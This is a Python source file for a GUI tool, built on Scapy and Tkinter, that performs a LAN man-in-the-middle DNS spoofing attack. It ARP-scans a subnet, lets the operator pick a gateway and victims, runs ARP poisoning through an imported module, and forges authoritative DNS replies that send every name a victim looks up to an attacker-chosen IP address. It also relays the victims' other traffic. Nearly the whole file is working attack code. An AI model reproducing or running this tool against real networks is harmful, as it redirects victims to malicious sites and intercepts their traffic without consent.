from scapy.all import *
from dnsarp import dnsarp
import threading
from Tkinter import*
import sys
import os

class dnsfinal():
    
    def __init__(self, interface, root):
        self.interface = interface
        self.root = root       
        
    def website_ip(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        Label(self.root, text='Enter the ip address of the website to where the user should be redirected:').pack()
        ipValue = Entry(self.root)
        ipValue.pack()

        def get_execute(self):
            self.ip_website = ipValue.get()
            for widget in self.root.winfo_children():
                widget.destroy()
            self.url = []
            self.myMAC = get_if_hwaddr(self.interface)
            self.startProcess()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()        
        
        
    def select_target(self):
        for widget in self.root.winfo_children():
            widget.destroy()
            
        self.target = []
        Label(self.root, text='Select the target IP').pack()
        OPTIONS = []
        for packet_sent, packet_received in self.usedIPs:
            OPTIONS.append(packet_received[ARP].psrc)

        select = Listbox(self.root, selectmode="multiple", width=50)
        for each_item in range(len(OPTIONS)):
            select.insert(END, OPTIONS[each_item])
        select.pack()
        
        def get_select(self):
            for i in select.curselection():
                inputInt = int(i)
                self.target.append(
                    {"ip": self.usedIPs[inputInt][1][ARP].psrc, "mac": self.usedIPs[inputInt][1][ARP].hwsrc})
            self.website_ip()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
            
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_select(self)).pack()
        
        
    def get_gateway(self):
        #now we will select the default gateway
        self.defaultGateway = []
        Label(self.root, text='Select one IP of the default gateway').pack()
        OPTIONS = []
        for packet_sent, packet_received in self.usedIPs:
            OPTIONS.append(packet_received[ARP].psrc)

        select = Listbox(self.root, selectmode="single", width=50)
        for each_item in range(len(OPTIONS)):
            select.insert(END, OPTIONS[each_item])
        select.pack()

        def get_select(self):
            for i in select.curselection():
                inputInt = int(i)
                self.defaultGateway.append(
                    {"ip": self.usedIPs[inputInt][1][ARP].psrc, "mac": self.usedIPs[inputInt][1][ARP].hwsrc})
            self.select_target()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:get_select(self)).pack()

    def get_IP(self):
        ipLabel = Label(self.root,text='Enter the range of IPs (i.e.:10.0.2.0/24)').pack()
        ipValue = Entry(self.root)
        ipValue.pack()
        
        def get_execute(self):
            self.rangeIPs = ipValue.get()
            self.usedIPs, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.rangeIPs), timeout=3,
                                   iface=self.interface)
            for widget in self.root.winfo_children():
                widget.destroy()
            self.get_gateway()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()
    
    
    def getInput(self):
        self.get_IP()
        

    def startProcess(self):
        self.startThread()
        for widget in self.root.winfo_children():
            widget.destroy()
      
        scroll = Scrollbar(self.root)
        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        self.re = Button(self.root, text="Reset", command=lambda:restart_program(self))
        self.re.pack(side=BOTTOM)
        self.printResult(scroll)
        while True:
            sniff(store=0, prn=lambda packet: self.doSpoofing(packet), iface=self.interface)

    def printResult(self, scroll):
        self.show = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
        scroll.config(command=self.show.yview)
        self.show.pack()
        self.show.insert(END, "DNS sniffing has started" + '\n')
        self.show.see(END)
        self.show.update_idletasks()

    def startThread(self):
        arpprocess = dnsarp(self.interface)
        arpprocess.setInput(self.rangeIPs, self.usedIPs, self.defaultGateway, self.target, self.myMAC, "y", "loud")
        proc_thread = None
        proc_thread = threading.Thread(target=arpprocess.startProcess)
        proc_thread.daemon = True
        proc_thread.start()

    #method which does the DNS spoofing of a packet
    def doSpoofing(self, packet):
        self.root.update()
        if packet.haslayer(Ether) and packet.haslayer(IP):#checks whether it is a correct packet
            try:
                if (packet.haslayer(DNS)) and (packet[DNS].qr == 0):#checks whether it is a DNS packet
                    if(self.defaultGateway[0]["mac"] == packet[Ether].src):
                        self.fromGatewayToTarget(packet)
                    else:
                        #check whether source is on the list of targets to spoof
                        for tar1 in self.target:
                            if tar1["mac"] == packet[Ether].src:
                                spoofedETHER, spoofedIP, spoofedUDP, spoofedDNS = self.CreateFakePacket(packet)
                                sendp(spoofedETHER/spoofedIP/spoofedUDP/spoofedDNS, iface=self.interface, verbose=False)
                                self.show.insert(END, "we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, self.ip_website) + '\n')
                                self.show.see(END)
                                self.show.update_idletasks()                     
                else:
                    if(packet[Ether].src == self.defaultGateway[0]["mac"]):
                        packet[Ether].src = packet[Ether].dst
                        for tar in self.target:
                            if tar["ip"] == packet[IP].dst:
                                packet[Ether].dst = tar["mac"]
                        sendp(packet, iface=self.interface, verbose=False)
                    else:
                        for tar in self.target:
                            if tar["mac"] == packet[Ether].src:
                                packet[Ether].src = self.myMAC
                                packet[Ether].dst = self.defaultGateway[0]["mac"]
                                sendp(packet, iface=self.interface, verbose=False)
            except:
                print("BAD DNS")

    def fromGatewayToTarget(self, packet):
        receiver = None
        for tar1 in self.target:
            if(tar1["ip"] == packet[IP].dst):
                receiver = tar1
                packet[Ether].src = self.myMAC
                packet[Ether].dst = receiver["mac"]
                sendp(packet, iface=self.interface, verbose=False)

    def CreateFakePacket(self, packet):
        spoofedETHER = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
        spoofedIP = IP(src=packet[IP].dst, dst=packet[IP].src)
        spoofedUDP = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
        spoofedDNSRR = DNSRR(rrname=packet[DNS].qd.qname, rdata=self.ip_website)
        spoofedDNS = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=spoofedDNSRR)
        return spoofedETHER,spoofedIP,spoofedUDP,spoofedDNS